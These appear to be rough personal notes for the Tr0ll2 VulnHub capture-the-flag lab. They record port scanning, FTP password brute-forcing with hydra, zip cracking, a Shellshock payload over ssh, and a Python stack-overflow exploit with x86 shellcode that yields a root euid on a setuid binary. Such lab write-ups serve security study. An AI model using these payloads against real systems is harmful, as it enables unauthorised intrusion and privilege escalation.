https://github.com/zionspike/vulnhub-writeup/blob/master/tr0ll-2/kapi-note.marked

https://resources.infosecinstitute.com/topic/practical-shellshock-exploitation-part-2/#gref

https://blog.knapsy.com/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/

```console

└─$ sudo nmap -sT -A -Pn -n -T4 -p-  172.16.16.129
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 22:27 CEST
Nmap scan report for 172.16.16.129
Host is up (0.0026s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:F7:66:43 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.59 ms 172.16.16.129

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```


```console
└─$ curl http://172.16.16.129             
<html>
<img src='tr0ll_again.jpg'>
</html>
<!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>

└─$ wget http://172.16.16.129/robots.txt
└─$ hydra -L robots.txt -P robots.txt ftp://172.16.16.129        
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 16:56:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:26/p:26), ~43 tries per task
[DATA] attacking ftp://172.16.16.129:21/
[STATUS] 274.00 tries/min, 274 tries in 00:01h, 402 to do in 00:02h, 16 active
[STATUS] 282.00 tries/min, 564 tries in 00:02h, 112 to do in 00:01h, 16 active
[21][ftp] host: 172.16.16.129   login: Tr0ll   password: Tr0ll
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 16:59:22
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip

```

```console
└─$ sed  -i -e 's/^\/\(.*\)/\1/' -e '1,2d'  robots.txt 

wfuzz -c -z file,robots.txt --hc 404 --hs "Under" http://172.16.16.129/FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================
000000017:   301        9 L      28 W       322 Ch      "ok_this_is_it"
000000001:   301        9 L      28 W       313 Ch      "noob"
000000014:   301        9 L      28 W       320 Ch      "dont_bother"
000000004:   301        9 L      28 W       320 Ch      "keep_trying"      
```

```console
└─$ curl http://172.16.16.129/dont_bother/
<html>
<img src='cat_the_troll.jpg'>
<!--What did you really think to find here? Try Harder!>
</html>
```

```console
└─$ strings ok_this_is_it.jpg
└─$ strings noob.jpg
└─$ strings dont_bother.jpg
└─$ strings keep_trying.jpg

Look Deep within y0ur_self for the answer


```


```console

└─$ wget http://172.16.16.129/y0ur_self/answer.txt
└─$ base64 --decode answer.txt | sort | uniq| wc > answer-decode.txt 
# for word in `cat answer.txt`; do echo $word | base64 -d; done > answer-decoded.txt

for word in $(cat answer.txt); do echo $word | base64 --decode >> answer2.txt; done

└─$ zip2john lmao.zip > lmao.hashes
└─$ 
└─$ john lmao.hashes   --show
lmao.zip/noob:ItCantReallyBeThisEasyRightLOL:noob:lmao.zip::lmao.zip
└─$ chmod 600 noob
└─$ ssh noob@172.16.16.129 -i noob
TRY HARDER LOL!
Connection to 172.16.16.129 closed.

└─$ ssh noob@172.16.16.129 -i noob -t "/bin/sh"
TRY HARDER LOL!
Connection to 172.16.16.129 closed.

└─$ ssh noob@172.16.16.129 -i noob  -t "bash --noprofile"
TRY HARDER LOL!
Connection to 172.16.16.129 closed.

# another tool
fcrackzip -v -D -u -p clanswer.txt lmao.zip

```

```console
└─$ ssh noob@172.16.16.129 -i noob  '() { :;}; /bin/bash' 
```

```console
md5sum /nothing_to_see_here/choose_wisely/door*/r00t
3471481302fe72ed05ab9dd0c6d6b256  /nothing_to_see_here/choose_wisely/door1/r00t
cce4a113cb9c4630eb12fa5a72732f19  /nothing_to_see_here/choose_wisely/door2/r00t
0e1049b1040b0598a364f33de29cc2a7  /nothing_to_see_here/choose_wisely/door3/r00t
cp /nothing_to_see_here/choose_wisely/door1/r00t door1
cp /nothing_to_see_here/choose_wisely/door2/r00t door2
cp /nothing_to_see_here/choose_wisely/door3/r00t door3
```


```bash
cp /nothing_to_see_here/choose_wisely/door2/r00t /home/noob/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/r00t
unlimit -c unlimited
```

```console
r $(cat input)
r $(python -c 'print "A"*268 + "B"*4 + "C"*100')
```


```python
import struct

def p(x):
    return struct.pack('<L', x)

nop = "\x90"
trap = "\xcc"

# gdb-peda$ shellcode generate x86/linux exec # dont work
shellcode = ""
shellcode += "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
shellcode += "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
shellcode += "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
shellcode += "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3"


#http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


# msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86
shellcode =  ""
shellcode += "\xdb\xd9\xd9\x74\x24\xf4\xb8\xd6\x16\xc5\x44\x5f\x31"
shellcode += "\xc9\xb1\x0b\x31\x47\x1a\x03\x47\x1a\x83\xef\xfc\xe2"
shellcode += "\x23\x7c\xce\x1c\x52\xd3\xb6\xf4\x49\xb7\xbf\xe2\xf9"
shellcode += "\x18\xb3\x84\xf9\x0e\x1c\x37\x90\xa0\xeb\x54\x30\xd5"
shellcode += "\xe4\x9a\xb4\x25\xda\xf8\xdd\x4b\x0b\x8e\x75\x94\x04"
shellcode += "\x23\x0c\x75\x67\x43"

buf = ""
buf += "A"*268
# buf += "B"*4
# buf += p(0xbffffb10)
buf += p(0xbffffb30)
buf += nop *100
buf += shellcode


print buf
```

```console
└─$ msfconsole                                                                              
msf6 > use payload/linux/x86/exec 
msf6 payload(linux/x86/exec) > set CMD /bin/sh
msf6 payload(linux/x86/exec) > generate -b '\x00\x0a\x0d'
# linux/x86/exec - 70 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, MeterpreterDebugLevel=0, 
# RemoteMeterpreterDebugFile=, CMD=/bin/sh, 
# NullFreeVersion=false
buf = 
"\xdd\xc3\xb8\x98\xd8\x46\x09\xd9\x74\x24\xf4\x5f\x33\xc9" +
"\xb1\x0b\x31\x47\x1a\x83\xc7\x04\x03\x47\x16\xe2\x6d\xb2" +
"\x4d\x51\x14\x11\x34\x09\x0b\xf5\x31\x2e\x3b\xd6\x32\xd9" +
"\xbb\x40\x9a\x7b\xd2\xfe\x6d\x98\x76\x17\x65\x5f\x76\xe7" +
"\x59\x3d\x1f\x89\x8a\xb2\xb7\x55\x82\x67\xce\xb7\xe1\x08"

```


```console
/nothing_to_see_here/choose_wisely/door2/r00t $(cat input)
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
```

```python

# cat ran_dir.py

#!/usr/bin/env python
import random
import shutil
import os

source1 = "/root/core1/"
source2 = "/root/core2/"
source3 = "/root/core3/"
source4 = "/root/core4/"

dest= "/nothing_to_see_here/choose_wisely/"

lottery = random.randrange(1,5)

def choice():
        if lottery == 1:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source1, dest, symlinks = False, ignore = None)
        elif lottery == 2:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source2, dest, symlinks = False, ignore = None)
        elif lottery == 3:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source3, dest, symlinks = False, ignore = None)
        elif lottery == 4:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source4, dest, symlinks = False, ignore = None)
choice()
os.system("chmod -R u+s /nothing_to_see_here")


```

```c

cat bof.c
#include <stdio.h>

int main(int argc, char * argv[]) {

        char buf[542];

        if(argc == 1) {

                printf("Usage: %s input\n", argv[0]);
                exit(0);

        }

        strcpy(buf,argv[1]);
        printf("%s", buf);
}


```


Ret2libc
wget -i uris_to_check.txt